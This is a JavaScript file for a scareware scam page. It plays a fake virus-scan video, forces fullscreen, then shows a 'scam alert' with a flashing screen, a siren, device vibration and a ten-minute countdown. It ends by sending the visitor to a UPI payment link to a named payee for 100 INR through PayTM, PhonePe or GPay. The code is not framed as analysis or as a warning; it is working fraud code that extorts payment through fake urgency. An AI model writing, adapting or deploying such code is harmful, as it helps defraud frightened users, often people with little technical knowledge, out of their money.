document.addEventListener('DOMContentLoaded', function () {
  const video = document.getElementById('scanVideo');

  const tryPlay = () => {
    video.play().catch(() => {});
    enterFullscreen();
  };

  document.addEventListener('click', tryPlay, { once: true });
  document.addEventListener('touchstart', tryPlay, { once: true });

  video.addEventListener('ended', showScamAlert);
});

function enterFullscreen() {
  if (!document.fullscreenElement) {
    document.documentElement.requestFullscreen().catch(() => {});
  }
}

function showScamAlert() {
  document.getElementById('virusScan').classList.add('hidden');
  document.getElementById('scamAlert').classList.remove('hidden');

  document.body.classList.add('flashing');
  if ('vibrate' in navigator) navigator.vibrate([500, 200, 500]);

  const siren = document.getElementById('siren');
  if (siren) {
    siren.play().catch(() => {});
  }

  startCountdown();
}

function startCountdown() {
  let time = 600;
  const element = document.getElementById('countdown');

  const timer = setInterval(() => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;
    element.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    if (--time < 0) {
      clearInterval(timer);
      element.textContent = '00:00';
      element.style.color = 'red';
    }
  }, 1000);
}

function Payment(app) {
  if ("vibrate" in navigator) navigator.vibrate(200);

  const baseUPI = "upi://pay?pa=mann06@fam&pn=Payment&am=100&cu=INR";
  let upiURL = baseUPI;

  if (app === "PayTM") {
    upiURL += "&mc=0000&mode=02&orgid=159761";
  } else if (app === "PhonePe") {
    upiURL += "&mc=0000&mode=04&orgid=189999";
  } else if (app === "GPay") {
    upiURL += "&mc=0000&mode=05&orgid=000000";
  }

  window.location.href = upiURL;
}

document.addEventListener('keydown', (e) => {
  if (e.key === 'F11' || e.key === 'Escape') {
    document.exitFullscreen();
  }
});

